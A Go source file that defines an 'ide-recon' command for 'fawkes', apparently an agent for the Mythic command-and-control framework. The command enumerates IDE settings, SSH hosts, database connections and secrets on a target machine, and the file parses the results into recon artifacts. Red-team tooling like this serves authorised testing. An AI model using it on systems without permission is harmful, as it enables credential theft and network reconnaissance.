package agentfunctions

import (
	"fmt"
	"path/filepath"
	"regexp"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "ide-recon",
		Description:         "Enumerate IDE configurations — VS Code and JetBrains extensions, remote SSH hosts, recent projects, data sources, and secrets",
		HelpString:          "ide-recon -action <vscode|jetbrains|all> [-user <filter>]",
		Version:             1,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1005", "T1083"},
		ScriptOnlyCommand:   false,
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "ide_recon_new.js"),
			Author:     "@galoryber",
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:      "vscode: VS Code settings, extensions, remote SSH, recent projects. jetbrains: IntelliJ/PyCharm/GoLand configs, data sources, deployment servers. all: scan both.",
				Choices:          []string{"all", "vscode", "jetbrains"},
				DefaultValue:     "all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 0},
				},
			},
			{
				Name:             "user",
				ModalDisplayName: "User Filter",
				CLIName:          "user",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Target specific user's home directory (optional, defaults to current user)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 1},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    "OPSEC WARNING: IDE/developer environment reconnaissance enumerates installed tools, project files, Git configs, Docker environments, and cloud CLI credentials. Accesses many config files across the filesystem — may generate file-access telemetry.",
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			user, _ := taskData.Args.GetStringArg("user")

			displayParams := action
			if user != "" {
				displayParams += " (user: " + user + ")"
			}
			response.DisplayParams = &displayParams

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			// Extract SSH targets: "  hostname (platform)"
			sshRe := regexp.MustCompile(`^\s{6}(\S+)\s+\(`)
			// Extract data sources: "  dbname: jdbc:..."
			dbRe := regexp.MustCompile(`^\s{8}(\S+):\s+(jdbc:\S+)`)
			// Extract sensitive settings: "  [SENSITIVE] key = value"
			sensitiveRe := regexp.MustCompile(`\[SENSITIVE\]\s+(\S+)`)

			inSSH := false
			inDB := false
			for _, line := range strings.Split(responseText, "\n") {
				trimmed := strings.TrimSpace(line)
				if strings.HasPrefix(trimmed, "Remote SSH targets:") {
					inSSH = true
					inDB = false
					continue
				}
				if strings.HasPrefix(trimmed, "Data sources") {
					inDB = true
					inSSH = false
					continue
				}
				if strings.HasPrefix(trimmed, "---") || trimmed == "" {
					inSSH = false
					inDB = false
				}
				if inSSH {
					if m := sshRe.FindStringSubmatch(line); m != nil {
						createArtifact(processResponse.TaskData.Task.ID, "Host Discovery",
							fmt.Sprintf("IDE SSH target: %s", m[1]))
					}
				}
				if inDB {
					if m := dbRe.FindStringSubmatch(line); m != nil {
						createArtifact(processResponse.TaskData.Task.ID, "Configuration",
							fmt.Sprintf("IDE data source: %s → %s", m[1], m[2]))
					}
				}
				if m := sensitiveRe.FindStringSubmatch(line); m != nil {
					createArtifact(processResponse.TaskData.Task.ID, "Configuration",
						fmt.Sprintf("IDE sensitive setting: %s", m[1]))
				}
			}
			return response
		},
	})
}
